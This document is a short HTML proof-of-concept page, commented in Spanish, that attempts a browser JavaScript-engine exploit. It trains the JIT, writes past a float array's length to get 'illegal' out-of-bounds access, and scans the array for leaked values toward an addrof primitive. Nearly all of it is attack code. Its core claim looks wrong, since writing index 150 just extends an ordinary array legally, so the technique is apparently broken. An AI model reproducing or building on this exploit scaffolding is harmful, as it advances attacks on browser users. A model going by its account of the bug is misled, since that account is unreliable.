<!DOCTYPE html>
<html>
<head>
  <title>PoC Mejorado: Escaneo heap</title>
</head>
<body>
  <h1>PoC: Escaneo para encontrar addrof</h1>
  <pre id="log"></pre>
  <script>
    const log = (msg) => document.getElementById("log").textContent += msg + "\n";

    let float_arr;
    let obj_arr;
    let oob;

    function setup() {
      float_arr = new Array(100).fill(1.1);
      obj_arr = [{}, {a: 13.37}, {b: 42}];
      // Entrenamos el JIT
      function confuse(arr, index, val) {
        for (let i = 0; i < 10000; i++) {
          arr[0] = 1.1;
        }
        arr[index] = val;
        return arr;
      }

      // Esto debe provocar la expansión ilegal del array
      oob = confuse(float_arr, 150, 13.37);
    }

    function dumpArray() {
      log("=== Dump extendido del array ===");
      for (let i = 0; i < 200; i++) {
        try {
          let v = oob[i];
          if (v !== 1.1 && typeof v === 'number') {
            log(`oob[${i}] = ${v}`);
          }
        } catch (e) {
          log(`oob[${i}] = [EXCEPTION]`);
        }
      }
    }

    setup();
    obj_arr[0] = {leak: true};
    dumpArray();
  </script>
</body>
</html>
